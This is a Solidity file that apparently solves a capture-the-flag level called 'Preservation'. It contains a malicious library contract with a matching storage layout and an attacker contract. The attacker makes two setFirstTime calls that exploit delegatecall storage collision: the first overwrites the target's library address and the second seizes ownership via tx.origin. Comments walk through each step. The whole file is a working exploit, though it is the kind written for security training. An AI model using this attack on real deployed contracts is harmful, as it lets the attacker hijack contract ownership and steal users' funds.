// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

contract EvilLibraryContract {
    //we need to provide the same layout of state variables as in the Preservation contract
    //everything that comes after owner is not required
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    function setTime(uint _time) public {
        owner = tx.origin;
    }
}

contract PreservationAttacker {
    IPreservation challenge;
    EvilLibraryContract evilLibrary;

    constructor(address challengeAddress) {
        challenge = IPreservation(challengeAddress);
        evilLibrary = new EvilLibraryContract();
    }

    function attack() external {
        //change the address of timeZone1Library in Preservation to the address of our EvilLibraryContract =>
        //delegatecall executes in the context of the calling contract => 
        //the state variables in te calling contract are modifieed
        challenge.setFirstTime(uint256(uint160(address(evilLibrary))));

        //we call the same method again => now, the setTime function of our EvilLibraryContract is executed, which changes the owner
        //the provided argument does not matter, because it's not used
        challenge.setFirstTime(1);

    }
}